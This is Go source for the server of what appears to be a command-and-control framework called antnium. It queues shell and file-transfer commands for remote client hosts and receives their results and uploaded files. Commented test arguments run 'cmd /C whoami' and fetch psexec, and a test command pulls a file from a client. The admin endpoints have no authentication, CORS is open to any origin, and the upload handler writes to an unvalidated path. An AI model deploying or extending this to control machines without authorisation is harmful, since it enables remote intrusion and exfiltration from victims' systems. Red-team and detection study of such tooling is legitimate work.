package server

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/dobin/antnium/model"
	"github.com/gorilla/handlers"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type Server struct {
	srvaddr string
	cmdDb   CmdDb
	hostDb  HostDb
}

func NewServer(port int) Server {
	w := Server{"127.0.0.1:4444", MakeCmdDb(), MakeHostDb()}

	// Init random for packet id generation
	// Doesnt need to be secure
	rand.Seed(time.Now().Unix())
	return w
}

func (s *Server) getRandomPacketId() string {
	return strconv.Itoa(rand.Int())
}

func (s *Server) Serve() {
	myRouter := mux.NewRouter().StrictSlash(true)

	myRouter.HandleFunc("/admin/commands", s.adminListCommands)
	myRouter.HandleFunc("/admin/commands/{computerId}", s.adminListCommandsComputerId)
	myRouter.HandleFunc("/admin/clients", s.adminListClients)
	myRouter.HandleFunc("/admin/addTestCommand", s.adminAddTestCommand)
	myRouter.HandleFunc("/admin/addCommand", s.adminAddCommand)

	myRouter.HandleFunc("/getCommand/{computerId}", s.getCommand)
	myRouter.HandleFunc("/sendCommand", s.sendCommand)
	myRouter.HandleFunc("/upload/{packetId}", s.uploadFile)

	// Angular UI via static directory. Copied during build.
	myRouter.PathPrefix("/").Handler(http.FileServer(http.Dir("./static")))
	// Allow CORS
	corsObj := handlers.AllowedOrigins([]string{"*"})

	fmt.Println("Starting webserver on " + s.srvaddr)
	log.Fatal(http.ListenAndServe(s.srvaddr, handlers.CORS(corsObj)(myRouter)))
}

func (s *Server) adminListCommands(rw http.ResponseWriter, r *http.Request) {
	srvCmds := s.cmdDb.getAll()
	json, err := json.Marshal(srvCmds)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *Server) adminListCommandsComputerId(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	var filteredCmds []SrvCmd = make([]SrvCmd, 5)
	srvCmds := s.cmdDb.getAll()
	for i, srvCmd := range srvCmds {
		if srvCmd.Command.ComputerId == computerId {
			filteredCmds = append(filteredCmds, srvCmd)
		}
		if i >= 5 {
			break
		}
	}

	json, err := json.Marshal(filteredCmds)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
	hostList := s.hostDb.getAsList()
	json, err := json.Marshal(hostList)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *Server) adminAddTestCommand(rw http.ResponseWriter, r *http.Request) {
	arguments := make(model.CmdArgument)
	//arguments["executable"] = "cmd"
	//arguments["arg1"] = "/C"
	//arguments["arg2"] = "whoami"

	//arguments["remoteurl"] = "http://127.0.0.1:4444/psexec.txt"
	//arguments["destination"] = "psexec.txt"

	packetId := s.getRandomPacketId()

	arguments["remoteurl"] = "http://127.0.0.1:4444/upload/" + packetId
	arguments["source"] = "README.md"

	response := make(model.CmdResponse)
	command := model.NewCommand("fileupload", "0", packetId, arguments, response)
	srvCmd := NewSrvCmd(command, STATE_RECORDED, SOURCE_SRV)
	s.cmdDb.add(srvCmd)
}

func (s *Server) adminAddCommand(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("Could not read body")
		return
	}

	var command model.CommandBase
	err = json.Unmarshal(reqBody, &command)
	if err != nil {
		log.WithFields(log.Fields{
			"body":  reqBody,
			"error": err,
		}).Info("Error add command")
		return
	}
	srvCmd := NewSrvCmd(command, STATE_RECORDED, SOURCE_SRV)
	s.cmdDb.add(srvCmd)
}

func (s *Server) getCommand(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	// Update last seen for this host
	s.hostDb.updateFor(computerId)

	srvCmd, err := s.cmdDb.getCommandFor(computerId)
	if err != nil {
		return
	}

	// Set source IP for this command
	srvCmd.ClientIp = r.RemoteAddr

	json, err := json.Marshal(srvCmd.Command)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}

	log.WithFields(log.Fields{
		"command": srvCmd.Command,
	}).Info("Get command")

	fmt.Fprint(rw, string(json))
}

func (s *Server) sendCommand(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("Could not read body")
		return
	}

	var command model.CommandBase
	err = json.Unmarshal(reqBody, &command)
	if err != nil {
		log.WithFields(log.Fields{
			"body":  reqBody,
			"error": err,
		}).Info("Error sending command")
		return
	}

	log.WithFields(log.Fields{
		"command": command,
	}).Info("Send command")

	s.cmdDb.update(command)
	s.hostDb.updateFor(command.ComputerId)
	fmt.Fprint(rw, "asdf")
}

func (s *Server) uploadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	packetId := vars["packetId"]

	filename := "upload/" + packetId

	out, err := os.Create(filename)
	if err != nil {
		log.Error("Could not open file: " + filename)
		return
	}
	defer out.Close()

	written, err := io.Copy(out, r.Body)
	if err != nil {
		log.Error("Error copying: " + err.Error())
		return
	}

	log.Infof("Written %d bytes to file %s", written, packetId)

	fmt.Fprintf(w, "ok\n")
}
